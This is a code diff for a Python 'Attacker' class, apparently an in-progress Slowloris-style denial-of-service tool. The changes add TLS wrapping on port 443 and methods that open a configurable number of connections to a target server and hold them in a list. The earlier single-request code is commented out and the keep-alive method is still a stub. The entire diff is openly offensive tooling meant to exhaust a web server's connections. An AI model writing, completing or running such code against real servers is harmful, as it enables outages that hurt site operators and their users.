@@ -1,10 +1,14 @@
 import socket
+import ssl
 
 
 class Attacker:
-    def __init__(self, target):
+    def __init__(self, target, numSockets):
         self.target = target
         self.port = 80
+        self.socketCount = numSockets
+
+        self.sockets = []
 
 
 
@@ -26,22 +30,36 @@ class Attacker:
             ]
 
         ]
-    #This method iniates an attack on a given target
-    def attackTarget(self):
+    #This method creates the sockets that will be used in the attack
+    def createSocket(self):
 
         #This needs to be changed to enable HTTPS connections, this implementation is currently
         loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        loris.connect((self.target, 80))
+        loris = ssl.wrap_socket(loris, ssl_version=ssl.PROTOCOL_SSLv23)
 
-        req = "GET / HTTP/1.1\nHost: "+self.target+"\r\n\r\n"
+        loris.connect((self.target, 443))
 
-        loris.send(req.encode())
+        self.sockets.append(loris)
 
-        info = loris.recv(10000)
+       # req = "GET / HTTP/1.1\nHost: "+self.target+"\r\n\r\n"
+
+        #loris.send(req.encode())
 
 
-        print(info.decode("utf8"))
+       # info = loris.recv(10000)
+
+
+        #print(info.decode("utf8"))
+
+    #Create all the sockets that will be used in the attack
+    def createAllSockets(self):
+        for i in range (0,self.socketCount):
+            self.createSocket()
+
+    def attackTarget(self):
+        self.createAllSockets()
+
 
     def stayAlive(self):
         pass
